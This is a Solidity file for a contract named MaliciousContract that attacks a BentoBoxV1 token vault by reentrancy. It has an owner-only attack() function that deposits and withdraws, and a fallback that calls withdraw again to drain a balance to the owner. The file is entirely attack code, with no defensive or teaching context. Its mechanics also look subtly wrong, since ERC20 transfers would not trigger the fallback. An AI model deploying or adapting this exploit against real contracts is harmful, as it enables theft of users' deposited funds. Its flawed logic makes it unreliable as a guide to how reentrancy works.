// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "./BentoBoxV1.sol"; // Import BentoBoxV1 contract
import "@openzeppelin/contracts/token/ERC20/IERC20.sol"; // Import ERC20 interface

contract MaliciousContract {
    address public owner;
    BentoBoxV1 public targetContract;
    IERC20 public token; // Declare token variable

    event AttackExecuted(uint256 amount);
    event WithdrawExecuted(uint256 amount);
    event BalanceBeforeAttack(uint256 balance);

    constructor(address payable _targetContract, address _token) public {
        require(_token != address(0), "Token address cannot be zero");
        owner = msg.sender;
        targetContract = BentoBoxV1(_targetContract);
        token = IERC20(_token); // Initialize token with the correct address
    }

    // Explicitly add a receive function to handle incoming Ether
    receive() external payable {}

    fallback() external payable {
        // Triggering reentrancy by calling withdraw again if there are available funds
        uint256 balance = targetContract.balanceOf(token, address(this)); // Use the actual token address
        if (balance > 0) {
            // Log the balance before attempting to withdraw
            emit BalanceBeforeAttack(balance);
            targetContract.withdraw(token, address(this), owner, balance, 0);
        }
    }

    function attack() external {
        require(msg.sender == owner, "Not the owner");

        // Check balance before attack
        uint256 beforeBalance = targetContract.balanceOf(token, address(this)); // Use the actual token address
        emit BalanceBeforeAttack(beforeBalance);

        // Execute deposit to trigger the fallback function
        targetContract.deposit(token, address(this), owner, beforeBalance, 0);

        // Now withdraw to trigger reentrancy
        targetContract.withdraw(token, address(this), owner, beforeBalance, 0);

        emit AttackExecuted(beforeBalance);
    }
}
